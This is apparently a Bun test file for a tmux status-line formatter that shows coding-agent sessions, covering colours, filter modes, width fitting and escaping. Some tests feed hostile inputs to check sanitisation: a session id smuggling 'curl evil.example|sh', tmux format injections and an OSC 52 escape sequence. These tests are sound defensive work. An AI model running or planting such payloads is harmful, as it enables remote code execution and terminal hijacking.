import { test, expect } from "bun:test";
import {
  formatStatusLine, abbreviate, chipToken, parseChipToken, nextShow, statusWidth, FILTER_TOKEN, SHOW_CYCLE, type StatusLineOpts,
} from "../../src/shared/statusline.ts";
import { mkRow } from "../helpers/mk-row.ts";

const OPTS: StatusLineOpts = { show: "all", max: 6, format: "{glyph} {tmux_session}:{tmux_window}" };

// The text a status bar shows, styles and ranges stripped — and the filter
// chip, which every line ends with, cut off.
const FILTER_RE = /( )?#\[range=user\|@filter\].*$/;
const plain = (s: string) => s.replace(FILTER_RE, "").replace(/#\[[^\]]*\]/g, "");
const chips = (s: string) => s.replace(FILTER_RE, "");

test("a chip is a status-coloured ▌ bar on the surface0 highlight, wrapped in its click range", () => {
  const rows = [mkRow({ session_id: "ab-1", status: "running", tmux_session: "work", tmux_window: "2" })];
  const out = formatStatusLine(rows, OPTS);
  expect(out.startsWith("#[range=user|@ab-1]#[bg=#313244,fg=#b4befe]▌")).toBe(true);
  expect(chips(out).endsWith(" #[default]#[norange]")).toBe(true);
  expect(plain(out)).toBe("▌⠋ work:2 ");
});

test("fields take the dash's colour roles: state glyph and name, faint coordinates, pink branch", () => {
  const rows = [mkRow({ session_id: "a", status: "waiting", name: "fix-auth", tmux_session: "w", tmux_window: "1", git_branch: "main" })];
  const out = formatStatusLine(rows, { ...OPTS, format: "{glyph} {name} {branch} {tmux_session}" });
  expect(out).toContain("#[fg=#f9e2af]?");
  expect(out).toContain("#[fg=#f9e2af]fix-auth");
  expect(out).not.toContain("bold");
  expect(out).toContain("#[fg=#f5c2e7]main");
  expect(out).toContain("#[fg=#6c7086]w");
  expect(plain(out)).toBe("▌? fix-auth main w ");
});

test("{name} falls back to the short id and is capped", () => {
  const unnamed = formatStatusLine([mkRow({ session_id: "0198abcd-1234-7aaa" })], { ...OPTS, format: "{name}" });
  expect(plain(unnamed)).toBe("▌0198abcd-1234 ");
  const long = formatStatusLine([mkRow({ name: "x".repeat(40) })], { ...OPTS, format: "{name}" });
  expect(plain(long).trim().length).toBeLessThanOrEqual(1 + 24);
});

test("a name cannot open a tmux style of its own", () => {
  const out = formatStatusLine([mkRow({ name: "evil #[fg=red]name" })], { ...OPTS, format: "{name}" });
  expect(out).toContain("evil ##[fg=red]name");
});

test("chips are separated by one space", () => {
  const rows = [
    mkRow({ session_id: "a", status: "running", tmux_session: "w", tmux_window: "1" }),
    mkRow({ session_id: "b", status: "waiting", tmux_session: "w", tmux_window: "2" }),
  ];
  expect(formatStatusLine(rows, OPTS)).toContain("#[default]#[norange] #[range=user|@b]");
});

test("the range token is the mark plus a 14-char id prefix — tmux's 15-byte cap", () => {
  const id = "0198abcd-1234-7aaa-bbbb-cccccccccccc";
  expect(chipToken(id)).toBe("@0198abcd-1234-");
  expect(chipToken(id).length).toBe(15);
  expect(parseChipToken(chipToken(id))).toEqual({ kind: "session", prefix: "0198abcd-1234-" });
  expect(parseChipToken(FILTER_TOKEN)).toEqual({ kind: "filter" });
  for (const t of ["window", "left", "", "@", "0198abcd"]) expect(parseChipToken(t)).toBeNull();
});

test("the line always ends in a ▽ filter chip showing the mode's glyphs", () => {
  const working = formatStatusLine([], { ...OPTS, show: "working" });
  expect(working).toBe(`#[range=user|${FILTER_TOKEN}]#[bg=#313244,fg=#7f849c] ▽ #[fg=#f9e2af]?#[fg=#a6e3a1]●#[fg=#b4befe]⠋ #[default]#[norange]`);
  expect(plain(formatStatusLine([], { ...OPTS, show: "all" })).length).toBe(0);
  const all = formatStatusLine([], { ...OPTS, show: "all" }).replace(/#\[[^\]]*\]/g, "");
  expect(all).toBe(" ▽ ?●⠋○ ");
  const waiting = formatStatusLine([mkRow({ session_id: "a" })], { ...OPTS, show: "waiting" }).replace(/#\[[^\]]*\]/g, "");
  expect(waiting).toBe(" ▽ ? ");
});

test("show modes: working = waiting+done+running, all adds idle", () => {
  const ID: Record<string, string> = { aa: "waiting", bb: "done", cc: "running", dd: "idle" };
  const rows = Object.entries(ID).map(([id, status]) => mkRow({ session_id: id, status: status as any }));
  const ids = (show: StatusLineOpts["show"]) =>
    [...chips(formatStatusLine(rows, { ...OPTS, show })).matchAll(/range=user\|@(\w+)/g)].map((m) => ID[m[1]!]);
  expect(ids("working")).toEqual(["waiting", "done", "running"]);
  expect(ids("all")).toEqual(["waiting", "done", "running", "idle"]);
  expect(ids("attention")).toEqual(["waiting", "done"]);
  expect(ids("waiting")).toEqual(["waiting"]);
});

test("nextShow cycles working › all › attention › waiting and wraps; right-click goes back", () => {
  expect(SHOW_CYCLE).toEqual(["working", "all", "attention", "waiting"]);
  expect(nextShow("working")).toBe("all");
  expect(nextShow("all")).toBe("attention");
  expect(nextShow("attention")).toBe("waiting");
  expect(nextShow("waiting")).toBe("working");
  expect(nextShow("working", -1)).toBe("waiting");
  expect(nextShow("done")).toBe("working"); // off-cycle config value restarts the cycle
});

test("null fields collapse the separator rather than leaving a dangling colon", () => {
  const rows = [mkRow({ session_id: "a", status: "idle", tmux_session: "w", tmux_window: null })];
  expect(plain(formatStatusLine(rows, OPTS))).toBe("▌○ w ");
});

test("an empty field leaves no doubled space behind", () => {
  const rows = [mkRow({ session_id: "a", status: "idle", name: "n", git_branch: null, tmux_session: "w" })];
  expect(plain(formatStatusLine(rows, { ...OPTS, format: "{glyph} {branch} {name} {tmux_window}" }))).toBe("▌○ n ");
});

test("{glyph} is a green ● for done and a grey ○ for idle", () => {
  const base = { session_id: "a", tmux_session: "w", tmux_window: "1" };
  const done = formatStatusLine([mkRow({ ...base, status: "done" })], OPTS);
  const idle = formatStatusLine([mkRow({ ...base, status: "idle" })], OPTS);
  expect(done).toContain("#[fg=#a6e3a1]●");
  expect(idle).toContain("#[fg=#9399b2]○");
});

test("show=waiting keeps only waiting rows", () => {
  const rows = [mkRow({ session_id: "a", status: "running" }), mkRow({ session_id: "b", status: "waiting" })];
  expect(formatStatusLine(rows, { ...OPTS, show: "waiting" })).toContain("range=user|@b");
  expect(formatStatusLine(rows, { ...OPTS, show: "waiting" })).not.toContain("range=user|@a");
});

test("show=done keeps only done rows", () => {
  const rows = [mkRow({ session_id: "a", status: "idle" }), mkRow({ session_id: "b", status: "done" })];
  expect(formatStatusLine(rows, { ...OPTS, show: "done" })).not.toContain("range=user|@a");
  expect(formatStatusLine(rows, { ...OPTS, show: "done" })).toContain("range=user|@b");
});

test("show=attention keeps waiting and done rows", () => {
  const rows = [
    mkRow({ session_id: "a", status: "idle" }), mkRow({ session_id: "b", status: "done" }),
    mkRow({ session_id: "c", status: "waiting" }), mkRow({ session_id: "d", status: "running" }),
  ];
  const out = formatStatusLine(rows, { ...OPTS, show: "attention" });
  for (const id of ["b", "c"]) expect(out).toContain(`range=user|@${id}`);
  for (const id of ["a", "d"]) expect(out).not.toContain(`range=user|@${id}`);
});

test("overflow past max collapses to a faint +N chip", () => {
  const rows = Array.from({ length: 5 }, (_, i) => mkRow({ session_id: `a${i}`, tmux_session: "w", tmux_window: String(i) }));
  expect(formatStatusLine(rows, { ...OPTS, max: 3 })).toContain("#[bg=#313244,fg=#6c7086] +2 #[default]");
});

test("empty row list renders just the filter chip, no stray separator", () => {
  expect(formatStatusLine([], OPTS).startsWith(`#[range=user|${FILTER_TOKEN}]`)).toBe(true);
});

test("abbreviate truncates from the middle, keeping the suffix legible", () => {
  expect(abbreviate("very-long-session-name-7", 12)).toBe("very-l…ame-7");
  expect(abbreviate("short", 12)).toBe("short");
});

test("never exceeds the width budget at any max", () => {
  const s = "very-long-session-name-7";
  for (let m = 1; m <= 20; m++) {
    const result = abbreviate(s, m);
    expect([...result].length).toBeLessThanOrEqual(m);
  }
});

test("preserves data with trailing separators in renderFormat", () => {
  const rows = [mkRow({ session_id: "a", project: "foo/", tmux_session: "work", tmux_window: null })];
  const out1 = formatStatusLine(rows, { ...OPTS, format: "{agent_kind} {project}" });
  expect(plain(out1)).toBe("▌claude foo/ ");

  const out2 = formatStatusLine(rows, { ...OPTS, format: "{glyph} {tmux_session}:{tmux_window}" });
  expect(plain(out2)).toBe("▌⠋ work ");
});

test("format string honours other placeholders", () => {
  const rows = [mkRow({ session_id: "agx-abcdef123", status: "running", agent_kind: "codex", project: "agmux" })];
  const out = formatStatusLine(rows, { ...OPTS, format: "{agent_kind}/{project} {status}" });
  expect(plain(out)).toBe("▌codex/agmux running ");
});

test("style templates replace the chip, overflow and filter looks; ranges still wrap them", () => {
  const rows = [
    mkRow({ session_id: "a", status: "waiting", name: "fix" }),
    mkRow({ session_id: "b", status: "running", name: "run" }),
  ];
  const out = formatStatusLine(rows, {
    ...OPTS, show: "working", max: 1, format: "{glyph} {name}",
    style: {
      chip: "#[fg={color}]{glyph}#[fg=white] {name}|",
      overflow: "(+{count})",
      filter: "[{mode}:{glyphs}]",
      separator: "·",
      colors: { waiting: "red" },
    },
  });
  expect(out).toBe(
    "#[range=user|@a]#[fg=red]?#[fg=white] fix|#[norange]·(+1)·"
    + `#[range=user|${FILTER_TOKEN}][working:#[fg=red]?#[fg=#a6e3a1]●#[fg=#b4befe]⠋]#[norange]`,
  );
});

test("{body} in a template is the role-coloured format, in the configured status colour", () => {
  const out = formatStatusLine([mkRow({ session_id: "a", status: "done", name: "n" })], {
    ...OPTS, format: "{glyph} {name}", style: { chip: "<{body}>", colors: { done: "#00ff00" } },
  });
  expect(out).toBe("#[range=user|@a]<#[fg=#00ff00]●#[fg=#6c7086] #[fg=#00ff00]n>#[norange] " + formatStatusLine([], { ...OPTS, style: { colors: { done: "#00ff00" } } }));
});

test("tmux #{…} formats in a template are left for tmux; unknown placeholders render empty", () => {
  const out = formatStatusLine([mkRow({ session_id: "a", name: "n" })], { ...OPTS, style: { chip: "#{pane_id}{nope}{name}" } });
  expect(out.startsWith("#[range=user|@a]#{pane_id}n#[norange]")).toBe(true);
});

test("plain fields in a template are escaped too", () => {
  const out = formatStatusLine([mkRow({ session_id: "a", name: "x#[fg=red]" })], { ...OPTS, style: { chip: "{name}" } });
  expect(out).toContain("x##[fg=red]");
});

// Fit to width: names shrink first (to NAME_MIN), only then chips fold into +N.
const named = (n: number, len = 20) =>
  Array.from({ length: n }, (_, i) => mkRow({ session_id: `a${i}`, status: "running", name: `${"abcdefghijklmnopqrstuvwxyz".slice(0, len - 1)}${i}` }));
const nameCaps = (s: string) => plain(s).split(" ").filter((w) => w.startsWith("▌")).map((w) => w.length - 1);
const NAME_FMT = { ...OPTS, format: "{name}" };

test("statusWidth counts the cells tmux draws: styles are free, ## is one #, wide is 2, private-use is 1", () => {
  expect(statusWidth("#[fg=red]ab#[default]")).toBe(2);
  expect(statusWidth("x##[fg=red]")).toBe(10);
  expect(statusWidth("日本")).toBe(4);
  expect(statusWidth("\u{e0b6}▌⠋")).toBe(3);
  expect(statusWidth("#[range=user|@a]x#[norange]")).toBe(1);
});

test("a line that fits the width is rendered as without one", () => {
  const rows = named(3);
  expect(formatStatusLine(rows, { ...NAME_FMT, width: 500 })).toBe(formatStatusLine(rows, NAME_FMT));
});

test("too wide: names shrink, all by the same cap, before any chip is hidden", () => {
  const rows = named(4);
  const full = formatStatusLine(rows, NAME_FMT);
  const width = statusWidth(full) - 12;
  const out = formatStatusLine(rows, { ...NAME_FMT, width });
  expect(statusWidth(out)).toBeLessThanOrEqual(width);
  expect(out).not.toContain("+");
  for (const r of rows) expect(out).toContain(`range=user|@${r.session_id}]`);
  const caps = nameCaps(out);
  expect(new Set(caps).size).toBe(1);
  expect(caps[0]!).toBeLessThan(20);
  expect(caps[0]!).toBeGreaterThanOrEqual(9);
  expect(out).toContain(`range=user|${FILTER_TOKEN}`);
});

test("names never shrink below 9 cells; past that the last chips fold into +N and the filter stays", () => {
  const rows = named(6);
  const width = 60;
  const out = formatStatusLine(rows, { ...NAME_FMT, width });
  expect(statusWidth(out)).toBeLessThanOrEqual(width);
  const shown = rows.filter((r) => out.includes(`range=user|@${r.session_id}]`));
  expect(shown.length).toBeLessThan(6);
  expect(shown.length).toBeGreaterThan(0);
  expect(shown).toEqual(rows.slice(0, shown.length));
  expect(nameCaps(out).every((c) => c === 9)).toBe(true);
  expect(out).toContain(` +${6 - shown.length} `);
  expect(out.endsWith("#[norange]") && out.includes(`range=user|${FILTER_TOKEN}`)).toBe(true);
});

test("hidden chips and max share one +N", () => {
  const rows = named(8);
  const out = formatStatusLine(rows, { ...NAME_FMT, max: 6, width: 60 });
  const shown = rows.filter((r) => out.includes(`range=user|@${r.session_id}]`)).length;
  expect(out).toContain(` +${8 - shown} `);
});

test("a {name} in a style template shrinks too", () => {
  const rows = named(4);
  const style = { chip: "[{name}]" };
  const width = statusWidth(formatStatusLine(rows, { ...NAME_FMT, style })) - 8;
  const out = formatStatusLine(rows, { ...NAME_FMT, style, width });
  expect(statusWidth(out)).toBeLessThanOrEqual(width);
  expect(out).not.toContain("+");
});

test("a width too small for anything still keeps the filter chip", () => {
  const out = formatStatusLine(named(3), { ...NAME_FMT, width: 3 });
  expect(out).toContain(`range=user|${FILTER_TOKEN}`);
  expect(out).not.toContain("range=user|@s");
});

test("a remote chip prefixes the name with ☁, counted by the width fit; escaping still applies", () => {
  const f = { ...OPTS, format: "{name}" };
  expect(plain(formatStatusLine([mkRow({ name: "fix", remote: true })], f))).toBe("▌☁ fix ");
  expect(plain(formatStatusLine([mkRow({ name: "fix" })], f))).toBe("▌fix ");
  expect(formatStatusLine([mkRow({ name: "a #[fg=red]", remote: true })], f)).toContain("☁ a ##[fg=red]");
  const rows = [mkRow({ name: "x".repeat(24), remote: true })];
  const out = formatStatusLine(rows, { ...f, width: 14 });
  expect(statusWidth(chips(out))).toBeLessThanOrEqual(14);
});

test("chipToken keeps only hex digits and dashes of a hostile id; parseChipToken refuses others", () => {
  const t = chipToken("x'; curl evil.example|sh #");
  expect(t).toMatch(/^@[0-9a-f-]*$/);
  expect(t).not.toContain("'");
  expect(parseChipToken("@ab'; sh")).toBeNull();
  expect(parseChipToken("@0198abcd-1234-")).toEqual({ kind: "session", prefix: "0198abcd-1234-" });
});

test("no tmux format survives in agent text: every # is doubled", () => {
  const out = formatStatusLine([mkRow({ name: "a #{host} #(id) #x" })], { ...OPTS, format: "{name}" });
  expect(out).toContain("a ##{host} ##(id) ##x");
  expect(statusWidth("a ##{host}")).toBe(9);
});

test("status-line fields carry no control characters", () => {
  const evil = "x\x1b]52;c;ZXZpbA==\x07\ny";
  const out = formatStatusLine([mkRow({ name: evil, git_repo: evil, git_branch: evil, project: evil, last_tool: evil, remote: true })],
    { ...OPTS, format: "{name} {repo} {branch} {project} {last_tool}" });
  expect(out).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
  expect(out).toContain("☁ x ]52;c;ZXZpbA== y");
});

test("a stale remote chip prefixes the name with ? instead of ☁ (spec §4.4)", () => {
  const f = { ...OPTS, format: "{name}" };
  expect(plain(formatStatusLine([mkRow({ name: "fix", remote: true, sync_stale: true })], f))).toBe("▌? fix ");
  expect(plain(formatStatusLine([mkRow({ name: "fix", remote: true, sync_stale: false })], f))).toBe("▌☁ fix ");
});
